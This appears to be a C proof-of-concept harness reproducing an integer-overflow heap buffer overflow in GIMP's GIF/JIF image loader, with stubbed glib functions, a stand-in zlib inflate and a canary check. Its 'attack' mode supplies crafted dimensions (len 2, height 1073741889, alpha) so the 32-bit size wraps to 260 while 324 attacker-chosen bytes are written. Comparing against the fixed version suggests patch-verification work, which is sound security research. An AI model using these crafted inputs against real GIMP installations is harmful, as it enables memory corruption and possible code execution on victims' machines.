/* Stand-in driver for verbatim ReadJeffsImage() bytes pinned from GIMP
 * file-gif-load.c at b5a3e0b6 (vulnerable parent) and 2b2bbb8f (fix).
 * No GIMP/GEGL/glib build: GObject/GError/ReadOK/read_error are stubs.
 */
#define _GNU_SOURCE
#include <limits.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <zlib.h>

typedef unsigned char  guchar;
typedef int            gint;
typedef unsigned int   guint;
typedef int            gboolean;
#define TRUE 1
#define FALSE 0
typedef void GimpImage;
typedef void GError;
#define _(s) (s)

static const char *g_error_msg = "";
#define read_error(msg, img, err) do { g_error_msg = (msg); } while (0)

typedef struct { guchar transparent; } GifColor;
static GifColor Gif89 = { 0x2a };
static guchar *g_allocs[8];
static size_t  g_alloc_n[8];
static int     g_nallocs = 0;
#ifdef PLAIN_MODE
static guchar *g_try_malloc (size_t n)
{
  guchar *p = (guchar *) malloc (n + 512);
  if (!p) return NULL;
  memset (p + n, 0x5a, 512);
  g_allocs[g_nallocs] = p;
  g_alloc_n[g_nallocs++] = n;
  return p;
}
static guchar *g_try_malloc0 (size_t n) { return g_try_malloc (n); }
static void g_free (void *p) { (void) p; }  /* keep canary readable */
#else
static guchar *g_try_malloc (size_t n)   { return (guchar *) malloc (n); }
static guchar *g_try_malloc0 (size_t n)  { return (guchar *) calloc (1, n); }
static void g_free (void *p)             { free (p); }
#endif
static gboolean
g_uint_checked_mul (guint *out, guint a, guint b)
{
  if (a != 0 && b > UINT_MAX / a)
    return FALSE;
  *out = a * b;
  return TRUE;
}

/* The chunked compressed stream is materialised in memory; the pin's
 * FILE*-based ReadOK() calls are served from this cursor. */
static guchar stream_bytes[4096];
static size_t stream_len = 0;
static size_t stream_pos = 0;

static gboolean
ReadOK (FILE *fd, void *buf, size_t n)
{
  (void) fd;
  if (stream_pos + n > stream_len)
    return FALSE;
  memcpy (buf, stream_bytes + stream_pos, n);
  stream_pos += n;
  return TRUE;
}

static size_t g_inflate_out = 0;
/* ASan-visible stand-in for zlib inflate: writes the attacker-chosen
 * decompressed payload into the pinned next_out with an instrumented loop.
 * System libz is not ASan-instrumented, so its own writes are invisible. */
#ifdef STANDIN_INFLATE
int inflateInit_ (z_streamp s, const char *v, int n)
{ (void) s; (void) v; (void) n; return Z_OK; }
int inflate (z_streamp s, int flush)
{
  size_t i, n = g_inflate_out;
  (void) flush;
  if (n > s->avail_out) n = s->avail_out;
  for (i = 0; i < n; i++)
    s->next_out[i] = 0x4d;
  s->total_out += (uLong) n;
  s->avail_out -= (uInt) n;
  s->avail_in = 0;
  return Z_STREAM_END;
}
int inflateEnd (z_streamp s) { (void) s; return Z_OK; }
#endif

#ifdef VARIANT_FIXED
#include "pins/jif-fixed.inc"
#else
#include "pins/jif-vulnerable.inc"
#endif

/* Build a JIF-style chunk stream whose zlib payload inflates to `outlen`
 * copies of 0x4d (attacker-chosen byte in the harness). */
static void
build_stream (size_t outlen)
{
  guchar plain[4096];
  guchar zbuf[4096];
  uLongf zlen = sizeof zbuf;
  size_t i, off = 0;

  for (i = 0; i < outlen; i++)
    plain[i] = 0x4d;
  if (compress2 (zbuf, &zlen, plain, (uLong) outlen, 9) != Z_OK)
    {
      fprintf (stderr, "compress2 failed\n");
      exit (2);
    }
  while (off < zlen)
    {
      size_t chunk = zlen - off;
      if (chunk > 255)
        chunk = 255;
      stream_bytes[stream_len++] = (guchar) chunk;
      memcpy (stream_bytes + stream_len, zbuf + off, chunk);
      stream_len += chunk;
      off += chunk;
    }
  stream_bytes[stream_len++] = 0;  /* end of JIF chunks */
  stream_pos = 0;
}

int
main (int argc, char **argv)
{
  const char *mode = (argc > 1) ? argv[1] : "attack";
  guchar dest[8192];
  GimpImage *image = NULL;
  GError *error = NULL;
  gint len, height;
  gboolean alpha;
  size_t outlen;
  gboolean rc;
  size_t i;
  if (! strcmp (mode, "safe"))
    {
      len = 4; height = 4; alpha = FALSE; outlen = 16;
    }
  else
    {
      /* len * height = 0x80000082; alpha_frame doubles it to 260 (32-bit
       * wrap), while zs.avail_out stays the unwrapped 0x80000082. */
      len = 2; height = 1073741889; alpha = TRUE; outlen = 324;
    }
  g_inflate_out = outlen;
  build_stream (outlen);
  rc = ReadJeffsImage (NULL, dest, 8, len, height, alpha, &image, &error);
  printf ("MODE=%s RC=%d ERR=%s\n", mode, rc ? 1 : 0, g_error_msg);
#ifdef PLAIN_MODE
  if (g_nallocs >= 2)
    {
      printf ("CANARY_AT=%zu FIRST=", g_alloc_n[1]);
      for (i = 0; i < 16; i++)
        printf ("%02x", g_allocs[1][g_alloc_n[1] + i]);
      printf ("\n");
    }
#endif
  return 0;
}
